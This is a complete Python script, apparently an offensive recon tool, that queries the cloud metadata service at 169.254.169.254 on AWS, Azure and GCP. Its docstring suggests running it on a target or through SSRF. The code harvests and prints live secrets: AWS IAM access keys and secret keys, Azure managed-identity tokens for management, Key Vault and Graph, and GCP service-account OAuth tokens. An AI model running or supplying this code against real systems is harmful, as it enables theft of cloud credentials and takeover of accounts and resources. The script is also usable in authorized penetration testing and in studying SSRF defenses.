#!/usr/bin/env python3
"""
imds_probe.py - metadata service recon for AWS / Azure / GCP
Run ON the target instance (or point SSRF at the same requests).
Short timeouts because 169.254.169.254 is link-local: fast when present,
dead-silent when not, so don't hang.
"""
import json
import urllib.request
import urllib.error

IMDS = "169.254.169.254"
TIMEOUT = 2  # link-local is instant if it exists; 2s is generous


def get(url, headers=None, method="GET", timeout=TIMEOUT):
    req = urllib.request.Request(url, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, f"{type(e).__name__}: {e}"


def aws():
    print("\n=== AWS ===")
    base = f"http://{IMDS}/latest"

    # Try IMDSv2 first: PUT to get a session token
    status, token = get(
        f"http://{IMDS}/latest/api/token",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        method="PUT",
    )
    hdrs = {}
    if status == 200 and token and "Error" not in token:
        hdrs = {"X-aws-ec2-metadata-token": token}
        print("[+] IMDSv2 token obtained (instance requires v2)")
    else:
        print("[*] No v2 token — trying IMDSv1 (unauthenticated GET)")

    status, role = get(f"{base}/meta-data/iam/security-credentials/", headers=hdrs)
    if status != 200 or not role:
        print(f"[-] No IAM role exposed (status={status})")
        return
    role = role.strip().splitlines()[0]
    print(f"[+] Role: {role}")

    status, creds = get(
        f"{base}/meta-data/iam/security-credentials/{role}", headers=hdrs
    )
    if status == 200:
        try:
            c = json.loads(creds)
            print(f"[+] AccessKeyId:     {c.get('AccessKeyId')}")
            print(f"[+] SecretAccessKey: {c.get('SecretAccessKey')}")
            print(f"[+] Token:           {c.get('Token', '')[:40]}...")
            print(f"[+] Expiration:      {c.get('Expiration')}")
        except json.JSONDecodeError:
            print(creds)


def azure():
    print("\n=== Azure ===")
    hdrs = {"Metadata": "true"}  # required, no header = no response

    status, inst = get(
        f"http://{IMDS}/metadata/instance?api-version=2021-02-01", headers=hdrs
    )
    if status != 200:
        print(f"[-] Not Azure / IMDS unreachable (status={status})")
        return

    try:
        compute = json.loads(inst).get("compute", {})
        print(f"[+] Subscription: {compute.get('subscriptionId')}")
        print(f"[+] ResourceGrp:  {compute.get('resourceGroupName')}")
        print(f"[+] VM name:      {compute.get('name')}")
    except json.JSONDecodeError:
        pass

    # Managed identity token — ARM scope. Swap resource= for Key Vault / Graph / Storage.
    for resource in [
        "https://management.azure.com/",
        "https://vault.azure.net",
        "https://graph.microsoft.com",
    ]:
        status, tok = get(
            f"http://{IMDS}/metadata/identity/oauth2/token"
            f"?api-version=2018-02-01&resource={resource}",
            headers=hdrs,
        )
        if status == 200:
            try:
                t = json.loads(tok).get("access_token", "")
                print(f"[+] Token ({resource}): {t[:40]}...")
            except json.JSONDecodeError:
                pass
        else:
            print(f"[-] No managed identity for {resource} (status={status})")


def gcp():
    print("\n=== GCP ===")
    hdrs = {"Metadata-Flavor": "Google"}  # required
    base = f"http://{IMDS}/computeMetadata/v1"

    status, proj = get(f"{base}/project/project-id", headers=hdrs)
    if status != 200:
        print(f"[-] Not GCP / metadata unreachable (status={status})")
        return
    print(f"[+] Project: {proj}")

    status, sas = get(f"{base}/instance/service-accounts/", headers=hdrs)
    print(f"[+] Service accounts:\n{sas}")

    status, scopes = get(
        f"{base}/instance/service-accounts/default/scopes", headers=hdrs
    )
    print(f"[+] Default SA scopes:\n{scopes}")

    status, tok = get(
        f"{base}/instance/service-accounts/default/token", headers=hdrs
    )
    if status == 200:
        try:
            t = json.loads(tok).get("access_token", "")
            print(f"[+] OAuth token: {t[:40]}...")
        except json.JSONDecodeError:
            pass


if __name__ == "__main__":
    aws()
    azure()
    gcp()
